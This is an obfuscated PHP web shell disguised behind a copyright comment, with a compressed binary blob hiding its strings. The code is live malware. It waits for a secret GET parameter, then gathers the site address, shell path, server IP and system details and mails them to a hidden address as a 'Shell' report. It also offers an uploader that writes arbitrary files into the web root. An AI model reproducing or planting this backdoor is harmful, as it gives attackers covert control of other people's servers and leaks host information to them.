<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');���䶯ˈߛ�������ы��ח����Ͷ�٣����ҟ�륆���Ƌ����޽���������߀��;$_SERVER[O0] = explode('|||', gzinflate(substr('�      mUmo�6��1��`pX��:� )B��Y
�q�8�ɠ��D�"5��K���$�IV	���<ϑ��_Ͽ.���Ai+�Dn cw�NK�Ei����zꖐeqd��ԟ�p���D�N�[��(Q�n�&UB� Φ�i����J� ��0����_o��L��-O���3�y�BHX�Th�ۇ��<t�f|���XEѹ�^�8��=/7X�Z�	^� R�u��2�ݧ�%xs*��v�Zn��K������䢴�$Qn�?Q9�G<`��L.Z��K<dܩZ�M�J���)�A�OG篝z.	lxtM9��4~I_yN��xY"h4�ѩ�m�X� U�Ȉ+	R|�J�-�"f��}4����`���D;v�r߽��<�D��[�j�e\\���%����F�,_c�
d��ex���-ܛ����QΦ��7L��P��@�@��t����}G���d��L�2�	�o�����bǏ?���4h�&Lt|OQ3���ؠ& �����J�9u��u0o6���M��YL�Q��1j��W�O�?i����ߘ�C�B4f1�xO�tT�l��ؒY8�X�CI����tD�c������X"�X�j&w�d6FT7i9��9[Z�V+��:)o[��\\c���]
�ho���_��=��ؓP�X��N���w��\\�k:E]�#.y��j�?�o���W���`~ss�q��7���!���n���hJ��S�L/H��;y1�>_�V_����v��_����T^}mM�ُ���b\\8
;��VU 4��Q�k.>_^^���g����ۡ�U#Y�g�G����� �]����.W�Ж*���@��]�W��b�i;vV^�,�/��˺��:���_���mL�T�Z(�`�Ds�6������}v�\\-��>ۍ�r�����dnV�)Gd�HU��$[ի���<�r�+��XC�ᥢq�� �ˣ  ',0x0a, -8)));����ˑ�ӿ��ܟ��þ֦��ܣ�硿�����ͤ;?><?=$_SERVER{O0}[0];
if (@$_GET[$_SERVER{O0}{0x001}] == $_SERVER{O0}[0x0002]) {
	echo $_SERVER{O0}{0x00003};
if ($_SERVER{O0}[0x000004]($_SERVER{O0}{0x05})){
}else{
$img = $_SERVER{O0}[0x006]($_SERVER{O0}{0x0007}, $_SERVER{O0}[0x00008]);
$sec = $_SERVER{O0}{0x000009};
$_SERVER{O0}[0x0a]($img ,$sec);
$_SERVER{O0}{0x00b}($img);}
$ip = $_SERVER{O0}[0x000c]($_SERVER{O0}{0x0000d});
$malinx = $_SERVER[$_SERVER{O0}[0x00000e]];
$ra44 = $_SERVER{O0}{0x0f}(0x001, 0x000001869f);
$subj = "Result ./666 Shell|$ra44";
$to = $_SERVER{O0}[0x0010];
$headers = $_SERVER{O0}{0x00011};
$a45 = $_SERVER[$_SERVER{O0}[0x000012]];
$unameall = $_SERVER{O0}{0x0000013}();
$m22 = $ip . $_SERVER{O0}[0x014];
$data = "
++--------------[$] [N]K[T]hir[T]33n [$]--------------++

  --------------------------------------------------------
  ~~~~~~~~~~~~~~~~~~SETOR SHELL BOSSSQ~~~~~~~~~~~~~~~~~~~~
  --------------------------------------------------------

# Alamat Web : $malinx
# Dir Shell  : $a45
# IP Address : $m22
# uname -a   : $unameall

  --------------------------------------------------------
  ~~~~~~~~~There Is No Patch for Human Stupidity~~~~~~~~~~
  --------------------------------------------------------
";
@$_SERVER{O0}{0x0015}($to,$subj,$data,$headers);

echo $_SERVER{O0}[0x00016].$_SERVER{O0}{0x0000013}().$_SERVER{O0}{0x000017};
echo $_SERVER{O0}[0x0000018];
$root = $_SERVER[$_SERVER{O0}{0x019}];
$files = $_FILES[$_SERVER{O0}[0x001a]][$_SERVER{O0}{0x0001b}];
$dest = $root.$_SERVER{O0}[0x00001c].$files;
if(isset($_POST[$_SERVER{O0}{0x000001d}])) {
    if($_SERVER{O0}[0x01e]($root)) {
        if(@$_SERVER{O0}{0x001f}($_FILES[$_SERVER{O0}[0x001a]][$_SERVER{O0}[0x00020]], $dest)) {
            $web = $_SERVER{O0}{0x000021}.$_SERVER[$_SERVER{O0}[0x00000e]].$_SERVER{O0}[0x0000022];
            echo "Success!! Here Your Access -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
        } else {
            echo $_SERVER{O0}{0x023};
        }
    } else {
        if(@$_SERVER{O0}{0x001f}($_FILES[$_SERVER{O0}[0x001a]][$_SERVER{O0}[0x00020]], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo $_SERVER{O0}[0x0024];
        }
    }
}
}
?>
